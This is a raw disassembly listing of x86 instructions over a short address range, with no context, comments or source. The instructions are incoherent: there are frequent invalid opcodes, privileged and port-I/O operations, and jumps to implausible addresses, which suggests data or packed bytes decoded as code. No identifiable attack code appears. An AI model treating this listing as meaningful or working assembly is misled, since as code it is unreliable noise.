  41f80e:	mov    ds:0x6f1d3ea6,eax
  41f813:	sub    dl,BYTE PTR [ebp-0x7437bb47]
  41f819:	xchg   ebp,eax
  41f81a:	loope  0x41f7f6
  41f81c:	les    ebp,FWORD PTR [ecx+edx*4]
  41f81f:	inc    esi
  41f820:	mov    DWORD PTR [esi+0x6],ebx
  41f823:	daa    
  41f824:	pop    ss
  41f825:	pop    edi
  41f826:	jbe    0x41f801
  41f828:	jl     0x41f832
  41f82a:	mov    eax,ds:0xe596d032
  41f82f:	jmp    0xb40ad11d
  41f834:	ret    0x12d3
  41f837:	mov    dh,0x54
  41f839:	out    dx,eax
  41f83a:	and    al,0x49
  41f83c:	jb     0x41f7c7
  41f83e:	cmp    dl,ch
  41f840:	jp     0x41f823
  41f842:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41f844:	iret   
  41f845:	test   ch,dl
  41f847:	ficom  WORD PTR [eax]
  41f849:	ss sbb edx,eax
  41f84c:	push   ss
  41f84d:	pop    ebx
  41f84e:	(bad)  
  41f84f:	(bad)  
  41f850:	enter  0x1a33,0x14
  41f854:	(bad)  
  41f855:	pop    ds
  41f856:	je     0x41f81e
  41f858:	fisttp WORD PTR [edi]
  41f85a:	mul    DWORD PTR [esi]
  41f85c:	call   0xecda7281
  41f861:	cli    
  41f862:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41f864:	in     al,dx
  41f865:	dec    edi
  41f866:	adc    eax,0xc8e15f62
  41f86b:	fiadd  DWORD PTR [edx-0xbb3ccdb]
  41f871:	pop    esp
  41f872:	or     bl,BYTE PTR [edi-0x4d55db12]
  41f878:	jns    0x41f8c2
  41f87a:	or     bl,BYTE PTR [ebp+edi*8+0x367ab874]
  41f881:	jg     0x41f902
  41f883:	fld    TBYTE PTR [eax+0x5904cb9]
  41f889:	je     0x41f83a
  41f88b:	jne    0x41f8ea
  41f88d:	loopne 0x41f8a7
  41f88f:	cwde   
  41f890:	xchg   ebx,eax
  41f891:	loopne 0x41f909
  41f893:	sbb    DWORD PTR [edx-0x7b],edx
  41f896:	stos   DWORD PTR es:[edi],eax
  41f897:	or     BYTE PTR [ebx+0x43],ah
  41f89a:	and    dh,BYTE PTR [bp+si+0x11]
  41f89e:	push   esp
  41f89f:	mov    dh,0x19
  41f8a1:	and    eax,0x243dcd9e
  41f8a6:	pop    esp
  41f8a7:	daa    
  41f8a8:	mov    bl,0x2a
  41f8aa:	xchg   esp,eax
  41f8ab:	(bad)  
  41f8ac:	xor    al,0x9d
  41f8ae:	dec    ecx
  41f8af:	das    
  41f8b0:	(bad)  
  41f8b1:	add    BYTE PTR [esi-0x76],al
  41f8b4:	pop    es
  41f8b5:	mov    al,BYTE PTR [edx+edx*1+0x6c]
  41f8b9:	push   cs
  41f8ba:	(bad)  
  41f8bb:	and    al,BYTE PTR [ebx]
  41f8bd:	cmc    
  41f8be:	iret   
  41f8bf:	inc    eax
  41f8c0:	sbb    ebp,DWORD PTR [eax-0x74]
  41f8c3:	dec    eax
  41f8c4:	and    al,0xf3
  41f8c6:	add    dl,BYTE PTR [ecx+0x725a24a1]
  41f8cc:	aaa    
  41f8cd:	jb     0x41f8a9
  41f8cf:	int3   
  41f8d0:	xchg   ebp,eax
  41f8d1:	ins    DWORD PTR es:[edi],dx
  41f8d2:	jge    0x41f8e4
  41f8d4:	pop    ebx
  41f8d5:	dec    esp
  41f8d6:	ret    
  41f8d7:	sub    eax,0x3a40eb8a
  41f8dc:	test   eax,0xc05fb67c
  41f8e1:	xchg   edi,eax
  41f8e2:	int3   
  41f8e3:	cs enter 0x9af1,0xcf
  41f8e8:	mov    dh,al
  41f8ea:	pop    es
  41f8eb:	stos   DWORD PTR es:[edi],eax
  41f8ec:	bound  ebx,QWORD PTR [ebx+0x3925f296]
  41f8f2:	aad    0x16
  41f8f4:	les    edx,FWORD PTR [edi-0x1b2d80b9]
  41f8fa:	inc    ebp
  41f8fb:	dec    ebx
  41f8fc:	cmp    DWORD PTR [ebp-0xf762166],0xffffffdf
  41f903:	inc    esp
  41f904:	fisubr DWORD PTR [edx]
  41f906:	xchg   esi,eax
  41f907:	pop    edi
  41f908:	in     eax,0x4
  41f90a:	or     eax,0x16157532
  41f90f:	mov    bh,0x92
  41f911:	or     cl,BYTE PTR ds:[eax+0xa123762]
  41f918:	push   ecx
  41f919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f91a:	pop    ebp
  41f91b:	push   edi
  41f91c:	aaa    
  41f91d:	int    0x66
  41f91f:	pop    ss
  41f920:	data16 mov dl,0xca
  41f923:	dec    ebp
  41f924:	push   edi
  41f925:	xchg   ecx,eax
  41f926:	jns    0x41f8ef
  41f928:	loop   0x41f972
  41f92a:	test   ah,bl
  41f92c:	sbb    cl,BYTE PTR [edi-0x34dd9abb]
  41f932:	cmp    DWORD PTR [eax],eax
  41f934:	clc    
  41f935:	scas   eax,DWORD PTR es:[edi]
  41f936:	inc    ecx
  41f937:	or     al,0x2
  41f939:	fist   DWORD PTR [ebp+0x521373f5]
  41f93f:	fild   QWORD PTR [eax]
  41f941:	loope  0x41f94a
  41f943:	xchg   DWORD PTR [ebx+0x25],esp
  41f946:	and    al,0xd5
  41f948:	dec    ecx
  41f949:	xchg   edx,eax
  41f94a:	sub    eax,0x34ee9f6f
  41f94f:	sbb    esi,DWORD PTR [edx]
  41f951:	in     eax,0x12
  41f953:	sub    DWORD PTR [ebp+0x49c2bc57],0xffffffaf
  41f95a:	mov    ecx,ss
  41f95c:	aam    0xa7
  41f95e:	ds mov ebp,0x322ba5d9
  41f964:	add    esi,DWORD PTR [esi]
  41f966:	ror    BYTE PTR [edi],1
  41f968:	fisubr DWORD PTR [edi+0x5c71d57a]
  41f96e:	adc    ebx,ebx
  41f970:	sahf   
  41f971:	xchg   esi,eax
  41f972:	jg     0x41f9ab
  41f974:	lahf   
  41f975:	jne    0x41f9cd
  41f977:	jbe    0x41f90f
  41f979:	outs   dx,DWORD PTR ds:[esi]
  41f97a:	add    cl,BYTE PTR [edx-0x79]
  41f97d:	cmp    BYTE PTR [eax-0x30a51676],cl
  41f983:	and    DWORD PTR [esi+eiz*4],esp
  41f986:	aam    0xa7
  41f988:	inc    edi
  41f989:	sbb    BYTE PTR [ebp+0x738ebdb6],ah
  41f98f:	fist   DWORD PTR [ebx-0x17f48e79]
  41f995:	repnz mov cl,0x73
  41f998:	inc    edx
  41f999:	xor    bl,al
  41f99b:	or     ah,BYTE PTR [edi-0xc]
  41f99e:	stos   BYTE PTR es:[edi],al
  41f99f:	pop    ebx
  41f9a0:	jge    0x41f98d
  41f9a2:	ds mov bl,0x6d
  41f9a5:	xor    edi,DWORD PTR [eax]
  41f9a7:	sub    eax,0xd6df8f52
  41f9ac:	pop    ebx
  41f9ad:	mov    dh,0xf7
  41f9af:	stos   BYTE PTR es:[edi],al
  41f9b0:	sub    esp,DWORD PTR [esi+0x53af5421]
  41f9b6:	push   edx
  41f9b7:	test   al,0xd0
  41f9b9:	jb     0x41f953
  41f9bb:	es inc ecx
  41f9bd:	mov    DWORD PTR [eax+0x39],edx
  41f9c0:	xor    DWORD PTR [ebx+0x651ba36c],ecx
  41f9c6:	dec    esi
  41f9c7:	or     al,0x97
  41f9c9:	lds    edi,FWORD PTR [edx+0x63d7b6e]
  41f9cf:	test   DWORD PTR [edx+esi*2-0x71917f82],0x63cbbe09
  41f9da:	mov    ecx,cs
  41f9dc:	int    0x7b
  41f9de:	pushf  
  41f9df:	sbb    eax,0xb957438f
	...
  41f9f0:	add    BYTE PTR [edi-0x637fe3d1],bh
  41f9f6:	mov    bl,0xbf
  41f9f8:	aas    
  41f9f9:	sysexit 
  41f9fb:	pop    ecx
  41f9fc:	push   ss
  41f9fd:	jg     0x41fa1c
  41f9ff:	test   al,0x14
  41fa01:	ins    DWORD PTR es:[edi],dx
  41fa02:	je     0x41fa05
  41fa04:	add    BYTE PTR [ebx+0x69000003],ch
  41fa0a:	fstp   TBYTE PTR [esi]
  41fa0c:	adc    bl,BYTE PTR [esi+0x209f9f4e]
  41fa12:	ja     0x41f99a
  41fa14:	stos   DWORD PTR es:[edi],eax
  41fa15:	(bad)  
  41fa16:	mov    ebx,0x16ae28fa
  41fa1b:	push   ss
  41fa1c:	cmp    BYTE PTR [ebx],0xa3
  41fa1f:	scas   al,BYTE PTR es:[edi]
  41fa20:	ret    
  41fa21:	daa    
  41fa22:	and    ah,BYTE PTR [eax-0x31cf1b8d]
  41fa28:	test   BYTE PTR [ebx-0x3f3c38c1],cl
  41fa2e:	xchg   edx,eax
  41fa2f:	jg     0x41faa6
  41fa31:	mov    ch,0x19
  41fa33:	stos   DWORD PTR es:[edi],eax
  41fa34:	sub    al,0x8a
  41fa36:	add    ch,BYTE PTR cs:[edx+0x3dcebb18]
  41fa3d:	ds push esp
  41fa3f:	jmp    0x41faa8
  41fa41:	iret   
  41fa42:	bound  eax,QWORD PTR ds:0xbbc9f497
  41fa48:	push   edi
  41fa49:	cld    
  41fa4a:	in     al,0x63
  41fa4c:	lds    ecx,FWORD PTR [eax-0xcf6f78d]
  41fa52:	pop    esp
  41fa53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa54:	push   esi
  41fa55:	test   BYTE PTR [ebx+0x13],0xad
  41fa59:	push   ecx
  41fa5a:	int    0x67
  41fa5c:	std    
  41fa5d:	daa    
  41fa5e:	rcl    BYTE PTR [ebp-0x6bf9d0eb],cl
  41fa64:	xchg   ecx,eax
  41fa65:	mov    eax,0x5936317
  41fa6a:	or     dh,al
  41fa6c:	sbb    al,0xb7
  41fa6e:	mov    esp,0xe483b5c4
  41fa73:	cmp    cl,BYTE PTR [esp+eax*4]
  41fa76:	adc    eax,0xaf072d57
  41fa7b:	adc    edx,DWORD PTR ds:0x9ea9c31
  41fa81:	test   al,0xa1
  41fa83:	push   edx
  41fa84:	lahf   
  41fa85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa86:	imul   eax,DWORD PTR [ebx],0x775cc78f
  41fa8c:	ret    0x968f
  41fa8f:	dec    ebp
  41fa90:	adc    ecx,DWORD PTR [ebx]
  41fa92:	push   0xffffffe5
  41fa94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa95:	fcmovb st,st(5)
  41fa97:	in     eax,dx
  41fa98:	jl     0x41fa49
  41fa9a:	inc    ebx
  41fa9b:	xchg   cx,ax
  41fa9d:	and    BYTE PTR [ebp+0x7e64ac6f],ch
  41faa3:	xchg   DWORD PTR [ebx-0x77d2007d],edx
  41faa9:	push   esi
  41faaa:	push   ecx
  41faab:	and    eax,0x5e2431c
  41fab0:	mov    ebp,0xdd31ab23
  41fab5:	inc    ebx
  41fab6:	pop    ebp
  41fab7:	sub    DWORD PTR [ebp-0x5851000c],0x9057cd03
  41fac1:	dec    eax
  41fac2:	ja     0x41fb26
  41fac4:	push   ebp
  41fac5:	ret    
  41fac6:	jecxz  0x41fab5
  41fac8:	adc    ch,BYTE PTR [ecx+0x2880358]
  41face:	jp     0x41fa93
  41fad0:	adc    ah,BYTE PTR [esi]
  41fad2:	pop    esi
  41fad3:	icebp  
  41fad4:	inc    edx
  41fad5:	mov    edx,DWORD PTR [ebx]
  41fad7:	dec    esp
  41fad8:	cdq    
  41fad9:	mov    ds:0x50bc1d8f,eax
  41fade:	fucom  st(5)
  41fae0:	lods   eax,DWORD PTR ds:[esi]
  41fae1:	cli    
  41fae2:	push   ecx
  41fae3:	out    dx,al
  41fae4:	mov    cl,0x59
  41fae6:	dec    ebx
  41fae7:	pop    ecx
  41fae8:	icebp  
  41fae9:	test   eax,0x279b1a68
  41faee:	loope  0x41fb15
  41faf0:	and    esp,DWORD PTR [eax]
  41faf2:	add    al,0x50
  41faf4:	adc    BYTE PTR [eax],al
  41faf6:	(bad)  
  41faf7:	xlat   BYTE PTR ds:[ebx]
  41faf8:	mov    fs,eax
  41fafa:	aaa    
  41fafb:	int3   
  41fafc:	jg     0x41fb0c
  41fafe:	into   
  41faff:	jl     0x41fb35
  41fb01:	jae    0x41fb63
  41fb03:	aaa    
  41fb04:	cmp    ecx,DWORD PTR ds:0x937e3e1c
  41fb0a:	push   edx
  41fb0b:	loopne 0x41fa9c
  41fb0d:	pop    ebp
  41fb0e:	je     0x41faa7
  41fb10:	test   DWORD PTR [edx+edx*4-0x645c4c64],edi
  41fb17:	mov    DWORD PTR [edi-0x6d],0x8d95bf68
  41fb1e:	nop
  41fb1f:	mov    eax,0x9fb1472c
  41fb24:	cmp    ebp,DWORD PTR [ecx+eax*4]
  41fb27:	mov    edx,0xfbfb149
  41fb2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb2d:	and    esp,eax
  41fb2f:	loopne 0x41fb86
  41fb31:	xchg   ebx,edx
  41fb33:	cmp    al,0x2a
  41fb35:	les    ecx,FWORD PTR [edx+0x1f]
  41fb38:	ins    BYTE PTR es:[edi],dx
  41fb39:	cmp    BYTE PTR [ebx-0xa],al
  41fb3c:	outs   dx,BYTE PTR ds:[esi]
  41fb3d:	pop    ecx
  41fb3e:	outs   dx,BYTE PTR ds:[esi]
  41fb3f:	xlat   BYTE PTR ds:[ebx]
  41fb40:	lock idiv BYTE PTR [edx]
  41fb43:	test   DWORD PTR [eax+0x5c720b07],0x205e1652
  41fb4d:	daa    
  41fb4e:	mov    ds:0xb08bb18c,al
  41fb53:	out    dx,eax
  41fb54:	idiv   DWORD PTR [esi-0x4e]
  41fb57:	loop   0x41fb3c
  41fb59:	mov    esi,0x6f1cc041
  41fb5e:	jb     0x41fbdd
  41fb60:	mov    ds:0x5c2c1023,eax
  41fb65:	imul   esp,DWORD PTR [esi-0x31],0x76748456
  41fb6c:	dec    eax
  41fb6d:	adc    eax,0xe4743749
  41fb72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb73:	enter  0xaeed,0x8b
  41fb77:	shl    eax,0x75
  41fb7a:	das    
  41fb7b:	fisub  DWORD PTR [edi+0x21e5ee04]
  41fb81:	cli    
  41fb82:	dec    eax
  41fb83:	pop    esp
  41fb84:	pop    edi
  41fb85:	stos   BYTE PTR es:[edi],al
  41fb86:	pop    ecx
  41fb87:	je     0x41fbfa
  41fb89:	pop    edx
  41fb8a:	fwait
  41fb8b:	daa    
  41fb8c:	sub    eax,0x9ae3d698
  41fb91:	retf   0xed34
  41fb94:	cdq    
  41fb95:	ds icebp 
  41fb97:	pusha  
  41fb98:	mov    esp,edx
  41fb9a:	ss cmp eax,edi
  41fb9d:	into   
  41fb9e:	loopne 0x41fbde
  41fba0:	mov    ch,0x3b
  41fba2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fba3:	dec    ebx
  41fba4:	adc    edx,ebx
  41fba6:	daa    
  41fba7:	fdivp  st(7),st
  41fba9:	sub    ebp,edi
  41fbab:	out    dx,al
  41fbac:	xor    BYTE PTR [ecx+0x5969c674],al
  41fbb2:	loopne 0x41fbce
  41fbb4:	push   ss
  41fbb5:	dec    eax
  41fbb6:	add    bh,BYTE PTR [edi]
  41fbb8:	xchg   edi,eax
  41fbb9:	mov    al,ds:0x8553b77b
  41fbbe:	stos   BYTE PTR es:[edi],al
  41fbbf:	rcr    DWORD PTR [eax+0x12],0x97
  41fbc3:	out    0xe9,eax
  41fbc5:	fbstp  TBYTE PTR [edx-0x5e5868e1]
  41fbcb:	out    0xb7,al
  41fbcd:	pop    esi
  41fbce:	out    dx,eax
  41fbcf:	retf   0x1c3
  41fbd2:	out    0xa6,al
  41fbd4:	or     eax,0x8ae9d4a8
  41fbd9:	sub    BYTE PTR [ecx+0x5c76734d],cl
  41fbdf:	sub    al,0x7d
  41fbe1:	adc    eax,DWORD PTR [ecx]
  41fbe3:	push   ecx
  41fbe4:	dec    esp
  41fbe5:	(bad)
  41fbe8:	cmc    
  41fbe9:	adc    al,0xa
  41fbeb:	cmp    ch,BYTE PTR [ecx+0x1f5c789b]
  41fbf1:	dec    BYTE PTR [esi+eiz*4-0x2f476d9c]
  41fbf8:	loope  0x41fba7
  41fbfa:	and    eax,0xe01d938e
  41fbff:	push   edx
  41fc00:	fmul   DWORD PTR [eax-0x15f89ddf]
  41fc06:	jle    0x41fbcb
  41fc08:	inc    edi
  41fc09:	cdq    
  41fc0a:	jne    0x41fc7a
  41fc0c:	jne    0x41fc47
  41fc0e:	ss ja  0x41fc0e
  41fc11:	out    dx,al
  41fc12:	icebp  
  41fc13:	fs sub al,0xb6
  41fc16:	xor    al,0xb6
  41fc18:	add    eax,0xe41b3288
  41fc1d:	xchg   ebx,eax
  41fc1e:	sbb    edi,eax
  41fc20:	dec    esp
  41fc21:	lgs    eax,FWORD PTR [eax-0x2c]
  41fc25:	lahf   
  41fc26:	dec    ecx
  41fc27:	pushf  
  41fc28:	inc    ecx
  41fc29:	dec    ebp
  41fc2a:	add    edi,esp
  41fc2c:	in     eax,dx
  41fc2d:	cdq    
  41fc2e:	push   0x4d918db2
  41fc33:	out    0x9e,al
  41fc35:	jp     0x41fc93
  41fc37:	dec    ebp
  41fc38:	dec    edi
  41fc39:	loop   0x41fc1b
  41fc3b:	mov    ah,ah
  41fc3d:	addr16 leave 
  41fc3f:	(bad)  
  41fc40:	aam    0xbb
  41fc42:	ins    DWORD PTR es:[edi],dx
  41fc43:	aaa    
  41fc44:	cdq    
  41fc45:	inc    eax
  41fc46:	push   ebp
  41fc47:	ds je  0x41fca2
  41fc4a:	adc    DWORD PTR [edi-0xb],edi
  41fc4d:	or     eax,0x6f2b3365
  41fc52:	test   al,0x8f
  41fc54:	adc    al,0x4d
  41fc56:	loope  0x41fc21
  41fc58:	xlat   BYTE PTR ds:[ebx]
  41fc59:	push   cs
  41fc5a:	popa   
  41fc5b:	cmp    esi,DWORD PTR ds:0x337925b6
  41fc61:	or     al,0x2e
  41fc63:	rcr    BYTE PTR [esi-0x52169ebc],1
  41fc69:	scas   al,BYTE PTR es:[edi]
  41fc6a:	cmp    BYTE PTR [esi+0x6e],0x5a
  41fc6e:	fld    DWORD PTR [ebx]
  41fc70:	ins    BYTE PTR es:[edi],dx
  41fc71:	and    BYTE PTR [ebp-0x27],0x5c
  41fc75:	inc    edx
  41fc76:	push   cs
  41fc77:	mov    ch,0x67
  41fc79:	into   
  41fc7a:	mov    dh,0xf
  41fc7c:	inc    edx
  41fc7d:	jp     0x41fc0b
  41fc7f:	pop    eax
  41fc80:	bound  eax,QWORD PTR [esi]
  41fc82:	pop    ebx
  41fc83:	enter  0x89bc,0xdb
  41fc87:	and    eax,0xc88eeee
  41fc8c:	cld    
  41fc8d:	jno    0x41fc2c
  41fc8f:	xchg   ebp,eax
  41fc90:	dec    ebx
  41fc91:	shl    DWORD PTR [edi],0x0
  41fc94:	inc    esp
  41fc95:	xchg   esi,eax
  41fc96:	sub    cl,BYTE PTR [eax]
  41fc98:	jl     0x41fce1
  41fc9a:	repz jae 0x41fc3e
  41fc9d:	push   esp
  41fc9e:	fstp   DWORD PTR [ecx+0x5f81c5a8]
  41fca4:	mov    eax,DWORD PTR ds:0x8707c084
  41fcaa:	(bad)  
  41fcab:	in     al,dx
  41fcac:	repnz push eax
  41fcae:	addr16 mov edx,0xe60d16ff
  41fcb4:	fsub   QWORD PTR [edx]
  41fcb6:	jp     0x41fd1b
  41fcb8:	fcomi  st,st(1)
  41fcba:	adc    DWORD PTR [ecx-0x57],edx
  41fcbd:	push   ecx
  41fcbe:	pop    ss
  41fcbf:	cmp    esi,ecx
  41fcc1:	or     DWORD PTR [ecx-0x13],esi
  41fcc4:	lods   eax,DWORD PTR ds:[esi]
  41fcc5:	movsx  edx,BYTE PTR [ecx+ecx*2]
  41fcc9:	add    DWORD PTR [esi+0x375476d8],ebx
  41fccf:	popa   
  41fcd0:	mov    DWORD PTR [ebp+0x19],edx
  41fcd3:	jg     0x41fd51
  41fcd5:	sbb    bh,BYTE PTR [ebp-0x728f204a]
  41fcdb:	shr    BYTE PTR [ecx+0x10],0x5e
  41fcdf:	iret   
  41fce0:	jp     0x41fcc2
  41fce2:	mov    dl,0xa9
  41fce4:	ins    DWORD PTR es:[edi],dx
  41fce5:	das    
  41fce6:	cmp    cl,BYTE PTR ds:0x8f753755
  41fcec:	outs   dx,BYTE PTR ds:[esi]
  41fced:	jmp    0x41fcae
  41fcef:	inc    esp
  41fcf0:	sbb    eax,0xeba70f08
  41fcf5:	hlt    
  41fcf6:	adc    ah,BYTE PTR [ebx]
  41fcf8:	push   edx
  41fcf9:	repz mov al,0xeb
  41fcfc:	pop    DWORD PTR gs:[ebp+0x56094b03]
  41fd03:	or     eax,0x78b7c6ec
  41fd08:	in     eax,dx
  41fd09:	inc    ebx
  41fd0a:	out    0xa6,eax
  41fd0c:	inc    esp
  41fd0d:	push   es
  41fd0e:	xchg   esi,eax
  41fd0f:	pop    ebx
  41fd10:	stos   DWORD PTR es:[edi],eax
  41fd11:	cmp    eax,0x4c91fd3b
  41fd16:	add    eax,0x15928d84
  41fd1b:	imul   esp,ecx,0xffffff9a
  41fd1e:	jmp    0x12e2e658
  41fd23:	mov    ebp,0xea76f1b8
  41fd28:	stc    
  41fd29:	adc    eax,0xd4cba36c
  41fd2e:	imul   ebp,DWORD PTR [ecx],0xffffffc8
  41fd31:	arpl   bp,ax
  41fd33:	ret    
  41fd34:	lods   al,BYTE PTR ds:[esi]
  41fd35:	test   DWORD PTR [ebx-0x7e995800],ebp
  41fd3b:	fimul  WORD PTR [edx]
  41fd3d:	mov    dx,WORD PTR [esi]
  41fd40:	jmp    0x41fcc6
  41fd42:	inc    ebx
  41fd43:	in     al,dx
  41fd44:	xchg   ecx,eax
  41fd45:	mov    dl,0xe6
  41fd47:	int3   
  41fd48:	mov    esp,0xa729c9e9
  41fd4d:	lds    ecx,FWORD PTR [edx+0x774ffba5]
  41fd53:	mov    ebp,0xc7b34d4c
  41fd58:	aam    0xda
  41fd5a:	jnp    0x41fd16
  41fd5c:	mov    ?,edx
  41fd5e:	mov    BYTE PTR [ebx-0x6f],0x39
  41fd62:	aam    0x92
  41fd64:	fnstcw WORD PTR [esi-0xfc2fa27]
  41fd6a:	ds mov edx,edi
  41fd6d:	xor    eax,0xe68f1b7e
  41fd72:	scas   al,BYTE PTR es:[edi]
  41fd73:	lock push ecx
  41fd75:	das    
  41fd76:	jmp    0x749f:0x7c1dea89
  41fd7d:	fcmovbe st,st(0)
  41fd7f:	fimul  WORD PTR [edi]
  41fd81:	call   0xba74:0x5684ba65
  41fd88:	sub    al,0x86
  41fd8a:	xchg   edx,eax
  41fd8b:	xchg   esi,eax
  41fd8c:	add    BYTE PTR [ebp+0x6e],0xfb
  41fd90:	cdq    
  41fd91:	add    eax,0x443146d0
  41fd96:	(bad)  
  41fd98:	xchg   edi,eax
  41fd99:	cmp    al,BYTE PTR [ecx+0x2d]
  41fd9c:	push   ebp
  41fd9d:	loop   0x41fd26
  41fd9f:	sbb    dh,BYTE PTR [ecx+0x7d8f79eb]
  41fda5:	icebp  
  41fda6:	xchg   esi,eax
  41fda7:	call   0x6b40:0xc79138fe
  41fdae:	icebp  
  41fdaf:	fcom   DWORD PTR [esi+ebx*2+0x3d6c]
	...
  41fdbe:	add    BYTE PTR [eax],al
  41fdc0:	add    BYTE PTR [ecx-0x400c494c],cl
  41fdc6:	repz int 0xfe
  41fdc9:	push   ebp
  41fdca:	cmp    BYTE PTR [edx-0x7a],bl
  41fdcd:	loop   0x41fe0d
  41fdcf:	lds    eax,FWORD PTR [edx]
  41fdd1:	sbb    BYTE PTR [eax+0x1],bh
  41fdd4:	add    BYTE PTR [ebx-0x5afffffd],ch
  41fdda:	cmc    
  41fddb:	loopne 0x41fd60
  41fddd:	loop   0x41fe40
  41fddf:	cmp    al,0x2a
  41fde1:	(bad)  
  41fde2:	std    
  41fde3:	mov    bl,0xb9
  41fde5:	pop    ebx
  41fde6:	xchg   esp,eax
  41fde7:	(bad)  
  41fde8:	xor    eax,0xd00e5d39
  41fded:	(bad)  
  41fdee:	mov    esi,DWORD PTR ds:0xe68b3f7c
  41fdf4:	sub    BYTE PTR [ebp-0x572f036c],0xdf
  41fdfb:	pop    ss
  41fdfc:	dec    ebp
  41fdfd:	scas   al,BYTE PTR es:[edi]
  41fdfe:	jle    0x41fe48
  41fe00:	mov    ebp,0xf7f9faaa
  41fe05:	hlt    
  41fe06:	sbb    DWORD PTR [ebx-0x229ad003],0xd107be72
  41fe10:	leave  
  41fe11:	test   DWORD PTR [ebp+ebp*4+0x3dd46443],ebp
  41fe18:	mov    ah,0xec
  41fe1a:	pop    esi
  41fe1b:	(bad)  
  41fe1d:	fcomp  DWORD PTR [esi+ecx*8]
  41fe20:	jecxz  0x41fe3e
  41fe22:	sub    al,0xf6
  41fe24:	sahf   
  41fe25:	adc    bh,dl
  41fe27:	and    edi,0x78
  41fe2a:	mov    al,ds:0xb50500b6
  41fe2f:	ficomp DWORD PTR [ebp-0x523d30da]
  41fe35:	ds push esi
  41fe37:	fistp  QWORD PTR [ebx]
  41fe39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe3a:	pcmpeqd mm2,mm0
  41fe3d:	lods   al,BYTE PTR ds:[esi]
  41fe3e:	jae    0x41fe39
  41fe40:	sub    al,0x84
  41fe42:	inc    esp
  41fe43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe44:	pop    ebp
  41fe45:	pop    ebx
  41fe46:	gs cld 
  41fe48:	sub    bh,BYTE PTR [ebx-0x74862f36]
  41fe4e:	cld    
  41fe4f:	add    DWORD PTR [edi],0xce1ded25
  41fe55:	imul   esi,DWORD PTR [edi],0x971f00a3
  41fe5b:	lock xchg esi,eax
  41fe5d:	fnstenv [ebx+0x2f]
  41fe60:	or     BYTE PTR [eax+ebp*2-0x1],cl
  41fe64:	(bad)  
  41fe65:	fisubr WORD PTR [esi-0x6c715f37]
  41fe6b:	mov    cl,bl
  41fe6d:	bound  ebx,QWORD PTR [ebp+0x71ab0358]
  41fe73:	jp     0x41fe04
  41fe75:	(bad)  
  41fe76:	cwde   
  41fe77:	loope  0x41fe78
  41fe79:	call   0x85766adc
  41fe7e:	sub    bh,BYTE PTR [di]
  41fe81:	xor    BYTE PTR [edi],ah
  41fe83:	clc    
  41fe84:	ja     0x41feb8
  41fe86:	je     0x41fee1
  41fe88:	fist   WORD PTR [edx+ebx*4]
  41fe8b:	inc    esi
  41fe8c:	mov    cl,0x3b
  41fe8e:	xor    DWORD PTR [ecx+0x6c],edi
  41fe91:	or     al,0xb
  41fe93:	dec    ebx
  41fe94:	dec    ebx
  41fe95:	rcl    DWORD PTR [edi-0x2f],0x12
  41fe99:	pop    es
  41fe9a:	sahf   
  41fe9b:	add    al,0x83
  41fe9d:	out    0xc,al
  41fe9f:	dec    esp
  41fea0:	lock and BYTE PTR [ecx+0x6cb5b27d],dh
  41fea7:	(bad)  
  41fea8:	fist   WORD PTR [eax]
  41feaa:	adc    BYTE PTR [ebx+0x33],dh
  41fead:	sub    edi,DWORD PTR [ebx+0x7835e0fe]
  41feb3:	scas   eax,DWORD PTR es:[edi]
  41feb4:	shl    esi,1
  41feb6:	fwait
  41feb7:	push   edx
  41feb8:	pop    ebp
  41feb9:	push   eax
  41feba:	mov    dl,0x7d
  41febc:	xchg   ebx,eax
  41febd:	push   0xaefd735c
  41fec2:	mov    BYTE PTR [ebp+0x15],bl
  41fec5:	add    eax,0xae69d1b7
  41feca:	jg     0x41fef5
  41fecc:	mov    ebx,DWORD PTR ds:0x601ee45d
  41fed2:	bound  esi,QWORD PTR [ebx+edx*2]
  41fed5:	sub    DWORD PTR [edx+0x3c],edi
  41fed8:	mov    dl,0x50
  41feda:	retf   0xd57
  41fedd:	pop    eax
  41fede:	mov    ch,0x5d
  41fee0:	mov    esp,0xc5f17875
  41fee5:	int3   
  41fee6:	out    dx,al
  41fee7:	shl    ah,cl
  41fee9:	pop    ds
  41feea:	inc    edi
  41feeb:	rcl    ebp,cl
  41feed:	xor    ebx,DWORD PTR [edx+0x664030bd]
  41fef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fef4:	inc    ecx
  41fef5:	inc    esi
  41fef6:	lods   eax,DWORD PTR ds:[esi]
  41fef8:	nop
  41fef9:	jne    0x41ff3c
  41fefb:	iret   
  41fefc:	xor    eax,0x17c1bc49
  41ff01:	(bad)  
  41ff02:	ins    BYTE PTR es:[edi],dx
  41ff03:	ja     0x41fe8c
  41ff05:	mov    cs,WORD PTR [eax]
  41ff07:	push   ds
  41ff08:	cmc    
  41ff09:	popa   
  41ff0a:	sbb    dh,BYTE PTR [ebp+0x26]
  41ff0d:	jae    0x41ff44
  41ff0f:	cdq    
  41ff10:	in     eax,dx
  41ff11:	pop    esp
  41ff12:	mov    ds:0xa27aef2,al
  41ff17:	std    
  41ff18:	jmp    0xfdcd:0x9fb0a0c1
  41ff1f:	aas    
  41ff20:	sub    dh,BYTE PTR [ebx]
  41ff22:	jnp    0x41fedc
  41ff24:	xchg   edx,eax
  41ff25:	and    DWORD PTR [edi-0x8880296],ebp
  41ff2b:	(bad)  
  41ff2c:	jge    0x41ff80
  41ff2e:	out    0xf5,al
  41ff30:	or     eax,0x58347c57
  41ff35:	cld    
  41ff36:	test   BYTE PTR [esi+0x69e31ff4],ah
  41ff3c:	pop    edi
  41ff3d:	imul   di,bp,0x35ea
  41ff42:	pop    ecx
  41ff43:	push   ecx
  41ff44:	bound  edi,QWORD PTR [ebx+edx*4+0x4f]
  41ff48:	xchg   ebp,eax
  41ff49:	cmp    esp,DWORD PTR [ebp-0x6f28504a]
  41ff4f:	(bad)  
  41ff50:	out    0xf3,eax
  41ff52:	pop    edi
  41ff53:	sub    esi,edx
